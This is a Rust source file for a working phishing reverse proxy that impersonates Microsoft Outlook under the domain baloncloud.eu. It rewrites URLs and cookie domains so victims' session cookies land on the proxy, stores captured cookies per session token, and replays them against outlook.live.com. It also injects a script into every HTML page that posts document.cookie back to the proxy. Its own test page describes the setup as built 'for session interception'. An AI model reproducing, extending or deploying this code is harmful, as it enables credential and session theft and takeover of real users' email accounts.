use actix_web::{HttpRequest, HttpResponse, Responder, http::header, web};
use serde::{Deserialize, Serialize};
use std::collections::HashMap;

use crate::cookie_capture::CookieCapture;
use crate::proxy_security::{log_request, is_ip_allowed, add_security_headers};

// Target Microsoft domains used by Outlook
const TARGET_DOMAIN: &str = "outlook.live.com";
const TARGET_URL: &str = "https://outlook.live.com";

// Other Microsoft domains that need to be proxied
const MICROSOFT_DOMAINS: &[&str] = &[
    "outlook.live.com",
    "outlook.office.com",
    "outlook.office365.com",
    "res.public.onecdn.static.microsoft",
    "res-1.cdn.office.net",
    "login.microsoftonline.com",
    "webshell.suite.office.net",
    "wwdb.webshell.suite.office.net",
    "eudb.webshell.suite.office.net",
    "content.lifecycle.office.net",
    "exo.nel.measure.office.net",
    "ad.doubleclick.net",
];

/// Proxy configuration
#[derive(Clone)]
pub struct ProxyConfig {
    pub proxy_domain: String,
    pub target_domain: String,
    pub target_url: String,
}

impl ProxyConfig {
    pub fn new(proxy_domain: String) -> Self {
        Self {
            proxy_domain,
            target_domain: TARGET_DOMAIN.to_string(),
            target_url: TARGET_URL.to_string(),
        }
    }
}

/// Rewrite URL to point to proxy domain
/// Example: https://outlook.live.com/owa/ → https://baloncloud.eu/owa/
fn rewrite_url_to_proxy(url: &str, config: &ProxyConfig) -> String {
    url.replace(&config.target_url, &format!("https://{}", config.proxy_domain))
        .replace(&config.target_domain, &config.proxy_domain)
}

/// Rewrite URL to point to target domain
/// Example: https://baloncloud.eu/owa/ → https://outlook.live.com/owa/
fn rewrite_url_to_target(url: &str, config: &ProxyConfig) -> String {
    if url.starts_with("https://") {
        let domain = url.split("/").nth(2).unwrap_or("");
        if domain == config.proxy_domain {
            return url.replace(&format!("https://{}", config.proxy_domain), &config.target_url);
        }
    }
    url.to_string()
}

/// Rewrite cookie domain
/// Example: Domain=outlook.live.com → Domain=baloncloud.eu
fn rewrite_cookie_domain(cookie: &str, config: &ProxyConfig) -> String {
    cookie.replace(
        &format!("Domain={}", config.target_domain),
        &format!("Domain={}", config.proxy_domain),
    )
    .replace(
        &format!("domain={}", config.target_domain),
        &format!("domain={}", config.proxy_domain),
    )
}

/// Build proxy request headers
fn build_proxy_headers(req: &HttpRequest, config: &ProxyConfig) -> reqwest::header::HeaderMap {
    let mut headers = reqwest::header::HeaderMap::new();
    
    // Copy relevant headers from original request
    for (name, value) in req.headers().iter() {
        let name_str = name.as_str().to_lowercase();
        
        // Skip headers that shouldn't be forwarded
        if name_str == "host" {
            // Replace Host header with target domain
            headers.insert(
                reqwest::header::HOST,
                reqwest::header::HeaderValue::from_str(&config.target_domain).unwrap(),
            );
            continue;
        }
        
        // Skip connection-specific headers
        if name_str == "connection" || name_str == "keep-alive" || name_str == "proxy-connection" {
            continue;
        }
        
        // Forward other headers
        if let Ok(value) = reqwest::header::HeaderValue::from_bytes(value.as_bytes()) {
            if let Ok(name) = reqwest::header::HeaderName::from_bytes(name.as_str().as_bytes()) {
                headers.insert(name, value);
            }
        }
    }
    
    // Add X-Forwarded headers
    headers.insert(
        "X-Forwarded-For",
        reqwest::header::HeaderValue::from_str(
            req.connection_info().peer_addr().unwrap_or("unknown")
        ).unwrap_or_else(|_| reqwest::header::HeaderValue::from_static("unknown")),
    );
    
    headers.insert(
        "X-Forwarded-Host",
        reqwest::header::HeaderValue::from_str(&config.proxy_domain).unwrap(),
    );
    
    headers.insert(
        "X-Forwarded-Proto",
        reqwest::header::HeaderValue::from_static("https"),
    );
    
    headers
}

/// Proxy request handler
/// Forwards all requests to outlook.live.com and rewrites responses
pub async fn proxy_handler(
    req: HttpRequest,
    body: web::Bytes,
    state: web::Data<crate::AppState>,
) -> impl Responder {
    let config = &state.proxy_config;
    let client = reqwest::Client::builder()
        .timeout(std::time::Duration::from_secs(30))
        .redirect(reqwest::redirect::Policy::none()) // Don't follow redirects, we'll handle them
        .build()
        .unwrap_or_default();
    
    // Extract token_id from path if present (e.g., /s/{token_id}/...)
    let path = req.uri().path();
    let token_id = if path.starts_with("/s/") {
        let parts: Vec<&str> = path.split('/').collect();
        if parts.len() > 2 {
            Some(parts[2].to_string())
        } else {
            None
        }
    } else {
        None
    };
    
    // Map proxy paths to real Microsoft domains and paths
    let (microsoft_domain, microsoft_path) = if path.starts_with("/s/") {
        // Session paths map to Outlook mail
        ("outlook.live.com", "/mail/")
    } else if path.starts_with("/owamail/") || path.starts_with("/assets/") {
        // CDN resources
        ("res.public.onecdn.static.microsoft", path)
    } else if path == "/" || path == "/owa/" {
        ("outlook.live.com", "/owa/")
    } else {
        ("outlook.live.com", path)
    };
    
    // Build target URL
    let target_url = format!("https://{}{}", microsoft_domain, microsoft_path);
    
    // Build proxy headers with captured cookies
    let mut headers = build_proxy_headers(&req, config);
    
    // If token_id is present, add captured cookies
    if let Some(ref tid) = token_id {
        let cookie_capture = CookieCapture::new(state.vault.clone());
        let cookies = match cookie_capture.get_cookies(&state.pool, tid).await {
            Ok(cookies) => cookies,
            Err(e) => {
                eprintln!("[proxy] Failed to get cookies for session {}: {}", tid, e);
                vec![]
            }
        };
        
        if !cookies.is_empty() {
            let cookie_str = cookies
                .iter()
                .map(|c| format!("{}={}", c.cookie_name, c.cookie_value))
                .collect::<Vec<_>>()
                .join("; ");
            headers.insert(
                "Cookie",
                reqwest::header::HeaderValue::from_str(&cookie_str).unwrap_or_else(|_| {
                    reqwest::header::HeaderValue::from_static("")
                }),
            );
        }
    }
    
    // Security: Check rate limit
    let conn_info = req.connection_info();
    let client_ip = conn_info.peer_addr().unwrap_or("unknown");
    let security_config = crate::proxy_security::SecurityConfig::from_env();
    
    let token_id_str = token_id.clone();
    
    if !security_config.rate_limiter.is_allowed(client_ip) {
        log_request(&req, token_id_str.as_deref(), 429, 0);
        return HttpResponse::TooManyRequests().json(serde_json::json!({
            "error": "rate_limit_exceeded",
            "message": "Too many requests. Please try again later.",
            "retry_after": 60
        }));
    }
    
    // Security: Check IP whitelist
    if let Some(whitelist) = security_config.ip_whitelist.as_deref() {
        if !crate::proxy_security::is_ip_allowed(client_ip, Some(whitelist)) {
            log_request(&req, token_id_str.as_deref(), 403, 0);
            return HttpResponse::Forbidden().json(serde_json::json!({
                "error": "ip_not_allowed",
                "message": "Your IP address is not authorized to access this proxy."
            }));
        }
    }
    
    println!("[proxy] {} {} → {} (token_id: {:?})", req.method(), req.uri(), target_url, token_id);
    
    // Create request builder
    let mut request_builder = client.request(
        reqwest::Method::from_bytes(req.method().as_str().as_bytes()).unwrap_or(reqwest::Method::GET),
        &target_url,
    );
    
    // Add headers
    request_builder = request_builder.headers(headers);
    
    // Add body if present
    if !body.is_empty() {
        request_builder = request_builder.body(body.to_vec());
    }
    
    // Send request
    let response = match request_builder.send().await {
        Ok(resp) => resp,
        Err(e) => {
            eprintln!("[proxy] Request failed: {}", e);
            return HttpResponse::BadGateway().body(format!("Proxy error: {}", e));
        }
    };
    
    let status = response.status();
    let response_headers = response.headers().clone();
    
    // Capture cookies from response if token_id is present
    if let Some(ref tid) = token_id {
        let cookie_capture = CookieCapture::new(state.vault.clone());
        if let Err(e) = cookie_capture.capture_from_response(&state.pool, tid, &response_headers).await {
            eprintln!("[proxy] Failed to capture cookies: {}", e);
        }
    }
    
    // Build response
    let mut resp = HttpResponse::build(
        actix_web::http::StatusCode::from_u16(status.as_u16()).unwrap_or(actix_web::http::StatusCode::OK)
    );
    
    // Copy and rewrite headers
    for (name, value) in response_headers.iter() {
        let name_str = name.as_str().to_lowercase();
        
        // Handle Set-Cookie headers
        if name_str == "set-cookie" {
            let cookie_value = value.to_str().unwrap_or("");
            let rewritten_cookie = rewrite_cookie_domain(cookie_value, config);
            
            // Log captured cookies
            if let Some(cookie_name) = cookie_value.split("=").next() {
                println!("[proxy] Captured cookie: {} (rewritten)", cookie_name.trim());
            }
            
            if let Ok(header_value) = header::HeaderValue::from_str(&rewritten_cookie) {
                resp.append_header((name.clone(), header_value));
            }
            continue;
        }
        
        // Handle Location header (redirects)
        if name_str == "location" {
            let location = value.to_str().unwrap_or("");
            let rewritten_location = rewrite_url_to_proxy(location, config);
            
            if let Ok(header_value) = header::HeaderValue::from_str(&rewritten_location) {
                resp.append_header((name.clone(), header_value));
            }
            continue;
        }
        
        // Handle Content-Security-Policy
        if name_str == "content-security-policy" {
            let csp = value.to_str().unwrap_or("");
            let rewritten_csp = csp.replace(&config.target_domain, &config.proxy_domain);
            
            if let Ok(header_value) = header::HeaderValue::from_str(&rewritten_csp) {
                resp.append_header((name.clone(), header_value));
            }
            continue;
        }
        
        // Skip content-encoding - reqwest decompresses automatically
        if name_str == "content-encoding" || name_str == "transfer-encoding" {
            continue;
        }
        
        // Forward other headers as-is
        if let Ok(header_value) = header::HeaderValue::from_bytes(value.as_bytes()) {
            resp.append_header((name.clone(), header_value));
        }
    }
    
    // Get response body
    let body_bytes = match response.bytes().await {
        Ok(bytes) => bytes,
        Err(e) => {
            eprintln!("[proxy] Failed to read response body: {}", e);
            return HttpResponse::BadGateway().body("Failed to read response body");
        }
    };
    
    // Check content type
    let content_type = response_headers.get("content-type")
        .and_then(|v| v.to_str().ok())
        .unwrap_or("");
    
    // Check if body is valid UTF-8 (to avoid trying to rewrite binary content)
    let body_text = String::from_utf8(body_bytes.to_vec());
    
    let body_content: String;
    let body_size: usize;
    
    if body_text.is_ok() && (content_type.contains("text/html") || content_type.contains("application/xhtml")) {
        let html = body_text.unwrap();
        body_content = rewrite_html_content(&html, config);
        body_size = body_content.len();
    } else if body_text.is_ok() && (content_type.contains("javascript") || content_type.contains("json")) {
        let js = body_text.unwrap();
        body_content = rewrite_js_content(&js, config);
        body_size = body_content.len();
    } else if body_text.is_ok() && content_type.contains("css") {
        let css = body_text.unwrap();
        body_content = rewrite_css_content(&css, config);
        body_size = body_content.len();
    } else if body_text.is_ok() && content_type.contains("text") {
        // Other text content
        body_content = body_text.unwrap();
        body_size = body_content.len();
    } else {
        // Binary content - forward as bytes without rewriting
        body_content = String::from_utf8_lossy(&body_bytes).to_string();
        body_size = body_content.len();
    };
    
    // Build response
    let mut response = resp.body(body_content);
    crate::proxy_security::add_security_headers(&mut response);
    let token_id_ref = token_id.as_ref().map(|s| s.as_str());
    log_request(&req, token_id_ref, status.as_u16(), body_size);
    response
}

/// Rewrite all Microsoft domains in content
fn rewrite_microsoft_domains(content: &str, proxy_domain: &str) -> String {
    let mut rewritten = content.to_string();
    
    for domain in MICROSOFT_DOMAINS {
        // Replace https://domain with https://proxy
        rewritten = rewritten.replace(
            &format!("https://{}", domain),
            &format!("https://{}", proxy_domain),
        );
        // Replace http://domain with https://proxy
        rewritten = rewritten.replace(
            &format!("http://{}", domain),
            &format!("https://{}", proxy_domain),
        );
        // Replace protocol-relative //domain with //proxy
        rewritten = rewritten.replace(
            &format!("//{}", domain),
            &format!("//{}", proxy_domain),
        );
    }
    
    rewritten
}

/// Rewrite HTML content - replace all references to Microsoft domains with proxy domain
fn rewrite_html_content(html: &str, config: &ProxyConfig) -> String {
    let mut rewritten = rewrite_microsoft_domains(html, &config.proxy_domain);
    
    // Inject cookie capture script
    let cookie_script = format!(r#"
<script>
(function() {{
    // Report cookies to proxy server
    fetch('https://{}/api/proxy/cookie-report', {{
        method: 'POST',
        headers: {{ 'Content-Type': 'application/json' }},
        body: JSON.stringify({{
            cookies: document.cookie,
            url: window.location.href,
            timestamp: new Date().toISOString()
        }})
    }}).catch(function(e) {{ console.log('Cookie report failed:', e); }});
}})();
</script>
"#, config.proxy_domain);
    
    // Insert script before </body> or </head>
    if rewritten.contains("</body>") {
        rewritten = rewritten.replace("</body>", &format!("{}</body>", cookie_script));
    } else if rewritten.contains("</head>") {
        rewritten = rewritten.replace("</head>", &format!("{}</head>", cookie_script));
    } else {
        rewritten.push_str(&cookie_script);
    }
    
    rewritten
}

/// Rewrite JavaScript content
fn rewrite_js_content(js: &str, config: &ProxyConfig) -> String {
    rewrite_microsoft_domains(js, &config.proxy_domain)
}

/// Rewrite CSS content
fn rewrite_css_content(css: &str, config: &ProxyConfig) -> String {
    rewrite_microsoft_domains(css, &config.proxy_domain)
}

/// Proxy status endpoint
pub async fn proxy_status_handler(state: web::Data<crate::AppState>) -> impl Responder {
    let config = &state.proxy_config;
    HttpResponse::Ok().json(serde_json::json!({
        "status": "active",
        "proxy_domain": config.proxy_domain,
        "target_domain": config.target_domain,
        "target_url": config.target_url,
        "timestamp": chrono::Utc::now().to_rfc3339()
    }))
}

/// Proxy health check
pub async fn proxy_health_check() -> impl Responder {
    HttpResponse::Ok().json(serde_json::json!({
        "status": "ok",
        "service": "proxy",
        "timestamp": chrono::Utc::now().to_rfc3339()
    }))
}

/// Test if proxy is working
pub async fn proxy_test_page(config: web::Data<ProxyConfig>) -> impl Responder {
    HttpResponse::Ok().content_type("text/html").body(format!(r#"<!DOCTYPE html>
<html>
<head>
    <title>Proxy Test - {}</title>
    <style>
        body {{ font-family: -apple-system, system-ui, sans-serif; max-width: 700px; margin: 40px auto; padding: 20px; background: #0a0a0a; color: #e0e0e0; }}
        .success {{ color: #22c55e; font-size: 48px; margin-bottom: 20px; }}
        h1 {{ color: #fff; font-size: 24px; margin-bottom: 10px; }}
        .info {{ background: #1a1a1a; border: 1px solid #333; padding: 20px; border-radius: 12px; margin: 20px 0; }}
        .info p {{ margin: 8px 0; font-size: 14px; color: #a0a0a0; }}
        .info strong {{ color: #e0e0e0; }}
        .status {{ display: inline-block; padding: 4px 12px; background: #22c55e20; color: #22c55e; border-radius: 20px; font-size: 12px; font-weight: 600; }}
        .warning {{ background: #f59e0b20; color: #f59e0b; padding: 12px; border-radius: 8px; margin: 20px 0; font-size: 13px; }}
        code {{ background: #2a2a2a; padding: 2px 8px; border-radius: 4px; font-size: 12px; color: #f59e0b; }}
        .next-steps {{ margin-top: 30px; }}
        .next-steps h2 {{ font-size: 18px; color: #fff; margin-bottom: 15px; }}
        .next-steps ol {{ color: #a0a0a0; font-size: 14px; line-height: 1.8; }}
        .next-steps li {{ margin: 8px 0; }}
        .check {{ color: #22c55e; font-weight: bold; }}
    </style>
</head>
<body>
    <div class="success">✓</div>
    <h1>Proxy Server Active</h1>
    <span class="status">RUNNING</span>
    
    <div class="info">
        <p><strong>Proxy Domain:</strong> <code>{}</code></p>
        <p><strong>Target Domain:</strong> <code>{}</code></p>
        <p><strong>Target URL:</strong> <code>{}</code></p>
        <p><strong>Status:</strong> <span class="check">Operational</span></p>
        <p><strong>Time:</strong> <span id="time"></span></p>
    </div>
    
    <div class="warning">
        <strong>⚠️ Important:</strong> This is a reverse proxy for Microsoft Outlook. All traffic is forwarded to 
        <code>{}</code> with cookies and URLs rewritten for session interception.
    </div>
    
    <div class="next-steps">
        <h2>Next Steps</h2>
        <ol>
            <li><span class="check">✓</span> Domain configured (baloncloud.eu)</li>
            <li><span class="check">✓</span> SSL certificate active</li>
            <li><span class="check">✓</span> Proxy server running</li>
            <li><span class="check">✓</span> URL rewriting enabled</li>
            <li><span class="check">✓</span> Cookie rewriting enabled</li>
            <li>→ Proceed to <strong>Step 3</strong>: Cookie Capture & Storage</li>
        </ol>
    </div>
    
    <script>
        document.getElementById('time').textContent = new Date().toISOString();
    </script>
</body>
</html>"#,
    config.proxy_domain,
    config.proxy_domain,
    config.target_domain,
    config.target_url,
    config.target_url
))
}
